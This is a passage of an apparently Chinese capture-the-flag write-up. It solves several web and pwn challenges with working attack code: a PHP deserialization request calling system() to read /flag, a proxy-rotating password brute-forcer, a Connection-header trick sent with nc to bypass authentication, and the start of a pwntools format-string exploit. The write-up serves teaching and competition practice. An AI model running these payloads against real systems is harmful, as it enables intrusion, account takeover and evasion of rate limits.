<pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/index.php?land=O%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3Bs%3A6%3A%22295468%22%3Bs%3A1%3A%22f%22%3Bs%3A4%3A%22test%22%3Bs%3A3%3A%22key%22%3Bs%3A5%3A%22class%22%3B%7Ds%3A1%3A%22f%22%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3Bs%3A0%3A%22%22%3Bs%3A1%3A%22f%22%3Bs%3A55%3A%22%00readflag%2Fvar%2Fwww%2Fhtml%2Findex.php%281%29+%3A+eval%28%29%27d+code%3A1%241%22%3Bs%3A3%3A%22key%22%3Bs%3A4%3A%22func%22%3B%7Ds%3A3%3A%22key%22%3Bs%3A4%3A%22none%22%3B%7D&amp;1=system(&#34;ls+%2F%3Bbase64+%27%2Fflag%27+%7C+base64+--decode&#34;);</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">eci-2zebka9daam6xqviqyeq.cloudeci1.ichunqiu.com:80</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----WebKitFormBoundaryMvFc5zDkBcoa1yiL</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">138</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------WebKitFormBoundaryMvFc5zDkBcoa1yiL
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;295468&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/jpeg
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{{file:line(C:\Users\baozhongqi\Desktop\final.phar.gz)}}
</span></span><span class="line"><span class="cl">------WebKitFormBoundaryMvFc5zDkBcoa1yiL--
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/img/2025-QWB-S9/32.png" alt="img"></p>
<h2 id="anime">anime</h2>
<p>每ip每秒限制5次登陆访问，题目提示5位数字的密码，可以上ip池爆破</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span><span class="p">,</span> <span class="n">as_completed</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;p.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">psa</span> <span class="o">=</span> <span class="p">[</span><span class="n">x</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># print(psa)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">target_url</span> <span class="o">=</span> <span class="s2">&#34;http://47.105.120.74:1001/login&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">filter_disabled_ips</span><span class="p">(</span><span class="n">psa</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ps</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="p">(</span><span class="n">psa</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">proxyMeta</span> <span class="o">=</span> <span class="s2">&#34;http://</span><span class="si">%(host)s</span><span class="s2">:</span><span class="si">%(port)s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;host&#34;</span><span class="p">:</span> <span class="n">ps</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;port&#34;</span><span class="p">:</span> <span class="n">ps</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="n">proxyMeta</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;https&#34;</span><span class="p">:</span> <span class="n">proxyMeta</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">in</span> <span class="p">[</span><span class="mi">302</span><span class="p">,</span> <span class="mi">200</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ps</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">ps</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># psa = filter_disabled_ips(psa)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># print(len(psa))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;TTXSMcc&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ps</span> <span class="o">=</span> <span class="n">psa</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">psa</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="n">proxyMeta</span> <span class="o">=</span> <span class="s2">&#34;http://</span><span class="si">%(host)s</span><span class="s2">:</span><span class="si">%(port)s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;host&#34;</span><span class="p">:</span> <span class="n">ps</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;port&#34;</span><span class="p">:</span> <span class="n">ps</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;http&#34;</span><span class="p">:</span> <span class="n">proxyMeta</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;https&#34;</span><span class="p">:</span> <span class="n">proxyMeta</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">302</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;failed.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># print(password, res.status_code, res.text)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;/login&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">tasks</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">futures</span> <span class="o">=</span> <span class="p">[</span><span class="n">executor</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">login</span><span class="p">,</span> <span class="n">pas</span><span class="p">)</span> <span class="k">for</span> <span class="n">pas</span> <span class="ow">in</span> <span class="n">tasks</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="p">(</span><span class="n">as_completed</span><span class="p">(</span><span class="n">futures</span><span class="p">),</span> <span class="n">total</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">futures</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">tasks</span> <span class="o">=</span> <span class="p">[</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="s2">05d</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100000</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># tasks = [x.strip() for x in open(&#39;failed.txt&#39;, &#39;r&#39;).readlines()]</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># open(&#39;failed.txt&#39;, &#39;w&#39;).write(&#34;&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">run</span><span class="p">(</span><span class="n">tasks</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>写wp的时候爆破出密码是18149（交flag的时候是89195）</p>
<p><img src="/img/2025-QWB-S9/33.png" alt="img"></p>
<p>登陆后编辑个人资料，没找到flag</p>
<p><img src="/img/2025-QWB-S9/34.png" alt="img"></p>
<p>注册的时候发现用户名大小写不敏感，尝试将用户名改成全小写，拿到flag（可能是缓存机制的问题？）</p>
<p><img src="/img/2025-QWB-S9/35.png" alt="img"></p>
<blockquote>
<p>flag{hhhu4ny1n6_q14n6w4n6_x14nf3n6}</p></blockquote>
<h2 id="secretvault">SecretVault</h2>
<p>前端go代理会先删掉发送的 X-User，再自己设置一个新的 X-User。再把请求发往后端前，反向代理会按 Connection 头列出的令牌删同名头部。</p>
<p><a href="https://datatracker.ietf.org/doc/html/rfc7230#section-6.1">RFC 7230 - Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Go" data-lang="Go"><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">authorizer</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">httputil</span><span class="p">.</span><span class="nx">ReverseProxy</span><span class="p">{</span><span class="nx">Director</span><span class="p">:</span> <span class="kd">func</span><span class="p">(</span><span class="nx">req</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">req</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nx">Scheme</span> <span class="p">=</span> <span class="s">&#34;http&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="nx">req</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nx">Host</span> <span class="p">=</span> <span class="s">&#34;127.0.0.1:5000&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="nx">uid</span> <span class="o">:=</span> <span class="nf">GetUIDFromRequest</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nx">log</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;Request UID: %s, URL: %s&#34;</span><span class="p">,</span> <span class="nx">uid</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">String</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">                <span class="nx">req</span><span class="p">.</span><span class="nx">Header</span><span class="p">.</span><span class="nf">Del</span><span class="p">(</span><span class="s">&#34;Authorization&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nx">req</span><span class="p">.</span><span class="nx">Header</span><span class="p">.</span><span class="nf">Del</span><span class="p">(</span><span class="s">&#34;X-User&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nx">req</span><span class="p">.</span><span class="nx">Header</span><span class="p">.</span><span class="nf">Del</span><span class="p">(</span><span class="s">&#34;X-Forwarded-For&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nx">req</span><span class="p">.</span><span class="nx">Header</span><span class="p">.</span><span class="nf">Del</span><span class="p">(</span><span class="s">&#34;Cookie&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="nx">uid</span> <span class="o">==</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nx">req</span><span class="p">.</span><span class="nx">Header</span><span class="p">.</span><span class="nf">Set</span><span class="p">(</span><span class="s">&#34;X-User&#34;</span><span class="p">,</span> <span class="s">&#34;anonymous&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nx">req</span><span class="p">.</span><span class="nx">Header</span><span class="p">.</span><span class="nf">Set</span><span class="p">(</span><span class="s">&#34;X-User&#34;</span><span class="p">,</span> <span class="nx">uid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>于是刚设置的 X-User 又被删掉，后端就完全收不到 X-User 了，直接默认设置了 <code>uid=0</code></p>
<p>应用代码如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">uid</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;X-User&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">uid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">uid</span> <span class="o">==</span> <span class="s1">&#39;anonymous&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Please sign in first.&#39;</span><span class="p">,</span> <span class="s1">&#39;warning&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">uid_int</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">uid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="p">(</span><span class="ne">TypeError</span><span class="p">,</span> <span class="ne">ValueError</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Invalid session. Please sign in again.&#39;</span><span class="p">,</span> <span class="s1">&#39;warning&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>构造数据包不好构造，直接 curl</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl"><span class="nb">printf</span> <span class="s1">&#39;GET /dashboard HTTP/1.1\r\nHost: 101.201.70.201:20509\r\nConnection: X-User\r\n\r\n&#39;</span> <span class="p">|</span> nc 101.201.70.201 <span class="m">20509</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/img/2025-QWB-S9/36.png" alt="img"></p>
<h1 id="pwn">Pwn</h1>
<h2 id="flag-market">Flag-market</h2>
<p>有一个全局变量的溢出写，可以覆盖到format变量</p>
<p><img src="/img/2025-QWB-S9/37.png" alt="img"></p>
<p><img src="/img/2025-QWB-S9/38.png" alt="img"></p>
<p>format变量在上面会用作printf参数，可以通过覆盖format字符串触发格式化字符串漏洞</p>
<p><img src="/img/2025-QWB-S9/39.png" alt="img"></p>
<p>通过泄露stream的地址，进而泄露IO_FILE结构体里buffer的地址，进而读出buffer中的数据，即flag</p>
<p><img src="/img/2025-QWB-S9/40.png" alt="img"></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bisect</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">s</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sa</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sl</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sla</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">r</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pr</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rl</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">inter</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#    pause()</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_addr</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_sb</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
